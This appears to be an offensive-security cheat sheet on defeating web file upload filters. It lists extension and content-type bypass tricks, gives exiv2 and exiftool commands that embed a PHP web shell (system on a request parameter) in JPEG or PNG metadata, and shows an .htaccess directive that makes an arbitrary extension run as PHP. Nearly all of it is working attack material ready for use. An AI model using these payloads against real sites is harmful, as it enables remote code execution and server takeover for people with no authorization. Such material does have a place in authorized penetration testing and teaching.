# 🔧 File Upload Checks

## <mark style="color:red;">Bypassing File Upload Restrictions</mark>

* file.php -> file.jpg
* file.php -> file.php.jpg
* file.asp -> file.asp;.jpg
* file.gif (contains php code, but starts with string GIF/GIF98)
* 00%
* file.jpg with php backdoor in exif (see below)
* .jpg -> proxy intercept -> rename to .php

## <mark style="color:red;">Injecting PHP into JPEG</mark>

```bash
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
exiftool “-comment<=back.php” back.png
```

## <mark style="color:red;">Uploading .htaccess to interpret .blah as .php</mark>

```
AddType application/x-httpd-php .blah
```
